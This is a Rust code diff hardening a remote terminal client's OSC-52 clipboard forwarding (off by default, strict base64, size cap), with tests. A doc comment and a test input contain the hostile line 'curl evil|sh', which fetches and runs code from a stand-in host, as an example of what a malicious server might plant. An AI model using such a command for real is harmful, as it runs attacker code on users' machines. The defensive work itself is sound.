@@ -14,6 +14,7 @@
 use std::io::{self, Write};
 
 use crate::predict::Overlay;
+use crate::terminal::MAXIMUM_CLIPBOARD_SIZE;
 use termina::escape::csi::{Csi, Cursor, DecPrivateMode, DecPrivateModeCode, Mode, Sgr};
 use termina::style::{ColorSpec, Intensity, RgbColor, Underline};
 use termina::OneBased;
@@ -203,6 +204,15 @@ fn sanitize_osc(t: &str) -> String {
     t.chars().filter(|c| !c.is_control()).collect()
 }
 
+/// Whether `s` is a well-formed base64 clipboard payload: non-empty and only the standard base64
+/// alphabet (`A–Z a–z 0–9 + / =`). A remote OSC-52 set should be base64; anything else is rejected
+/// rather than written verbatim to the user's terminal/clipboard (L-1 hardening).
+fn is_base64_payload(s: &str) -> bool {
+    !s.is_empty()
+        && s.bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'='))
+}
+
 /// The out-of-band window state for one frame.
 ///
 /// What the client mirrors onto the real terminal alongside the cell grid (window title, icon
@@ -225,6 +235,11 @@ pub struct OutOfBand {
     /// you're in a koh session — mosh's `[mosh] ` prefix (`$MOSH_TITLE_NOPREFIX` to disable).
     /// Empty disables it. Compared cells stay the *raw* title, so change-detection is unaffected.
     title_prefix: String,
+    /// Whether remote OSC-52 clipboard writes are honored. **Default OFF** (L-1): a malicious server
+    /// could otherwise silently overwrite the user's system clipboard (e.g. swap a copied command
+    /// for `curl evil|sh`). Opt in with `--clipboard` / `KOH_CLIPBOARD=1`; even then the payload is
+    /// validated as strict base64 within the size cap before it's forwarded.
+    clipboard_enabled: bool,
     /// Sticky (mosh's `title_initialized`): until the app sets a title/icon we don't touch the
     /// user's terminal title — and once it has, we DO propagate a later reset to empty.
     title_initialized: bool,
@@ -246,13 +261,22 @@ impl OutOfBand {
         }
     }
 
+    /// Enable (or disable) honoring remote OSC-52 clipboard writes (default off). Chainable:
+    /// `OutOfBand::with_title_prefix(p).with_clipboard(enabled)`.
+    #[must_use]
+    pub fn with_clipboard(mut self, enabled: bool) -> Self {
+        self.clipboard_enabled = enabled;
+        self
+    }
+
     /// Invalidate the tracked out-of-band state so the next [`emit`](Self::emit) re-asserts the
     /// title, clipboard, bell baseline, and input modes from scratch. Used after a suspend/resume
     /// (the terminal left and re-entered raw mode + the alternate screen), where everything the
     /// client had mirrored must be re-emitted. The `title_prefix` is preserved.
     pub fn invalidate(&mut self) {
         let prefix = std::mem::take(&mut self.title_prefix);
-        *self = Self::with_title_prefix(prefix);
+        let clipboard_enabled = self.clipboard_enabled;
+        *self = Self::with_title_prefix(prefix).with_clipboard(clipboard_enabled);
     }
 
     /// Emit this frame's title/icon / clipboard / bell / input-mode changes to `out`, updating the
@@ -264,11 +288,17 @@ impl OutOfBand {
         win: WindowState<'_>,
     ) -> io::Result<()> {
         self.emit_window_title(out, win.title, win.icon)?;
-        // Clipboard (OSC 52): re-emit on change. base64 from the server, sanitized defensively.
-        if win.clipboard != self.last_clipboard {
+        // Clipboard (OSC 52): OFF by default (L-1). A remote server must not silently overwrite the
+        // user's system clipboard. Only when the user explicitly opted in (`--clipboard` /
+        // `KOH_CLIPBOARD=1`) do we forward it — and only a strict-base64 payload within the size cap
+        // (the synced value is already capped client-side; we re-check defensively).
+        if self.clipboard_enabled && win.clipboard != self.last_clipboard {
             self.last_clipboard = win.clipboard.to_string();
-            if !win.clipboard.is_empty() {
-                write!(out, "\x1b]52;c;{}\x07", sanitize_osc(win.clipboard))?;
+            if !win.clipboard.is_empty()
+                && win.clipboard.len() <= MAXIMUM_CLIPBOARD_SIZE
+                && is_base64_payload(win.clipboard)
+            {
+                write!(out, "\x1b]52;c;{}\x07", win.clipboard)?;
             }
         }
         // Bell: ring once when the server's bell count climbs (coalesced if several rang).
@@ -459,21 +489,53 @@ mod tests {
     }
 
     #[test]
-    fn out_of_band_forwards_clipboard_on_change() {
+    fn out_of_band_clipboard_off_by_default_emits_nothing() {
+        // L-1: a default OutOfBand must NOT forward a server-set clipboard — no OSC 52 reaches the
+        // terminal even though the clipboard changed (the user never opted in).
         let mut oob = OutOfBand::default();
         let scr = screen_of(b"");
         let mut buf = Vec::new();
         oob.emit(&mut buf, &scr, win("", "", "aGVsbG8=", 0))
             .unwrap();
         assert!(
+            !String::from_utf8_lossy(&buf).contains("\x1b]52;"),
+            "no OSC-52 without explicit opt-in, got {:?}",
+            String::from_utf8_lossy(&buf)
+        );
+    }
+
+    #[test]
+    fn out_of_band_forwards_clipboard_when_opted_in() {
+        let mut oob = OutOfBand::default().with_clipboard(true);
+        let scr = screen_of(b"");
+        let mut buf = Vec::new();
+        oob.emit(&mut buf, &scr, win("", "", "aGVsbG8=", 0))
+            .unwrap();
+        assert!(
             String::from_utf8_lossy(&buf).contains("\x1b]52;c;aGVsbG8=\x07"),
-            "clipboard OSC 52 forwarded"
+            "clipboard OSC 52 forwarded when opted in"
         );
         // Same clipboard again → not re-emitted.
         let mut buf = Vec::new();
         oob.emit(&mut buf, &scr, win("", "", "aGVsbG8=", 0))
             .unwrap();
         assert!(!String::from_utf8_lossy(&buf).contains("\x1b]52;"));
+    }
+
+    #[test]
+    fn out_of_band_rejects_non_base64_clipboard_even_when_opted_in() {
+        // Even with the opt-in on, a non-base64 payload (e.g. raw shell injection) is dropped, not
+        // written verbatim to the terminal.
+        let mut oob = OutOfBand::default().with_clipboard(true);
+        let scr = screen_of(b"");
+        let mut buf = Vec::new();
+        oob.emit(&mut buf, &scr, win("", "", "curl evil|sh", 0))
+            .unwrap();
+        assert!(
+            !String::from_utf8_lossy(&buf).contains("\x1b]52;"),
+            "a non-base64 clipboard payload is rejected, got {:?}",
+            String::from_utf8_lossy(&buf)
+        );
     }
 
     #[test]
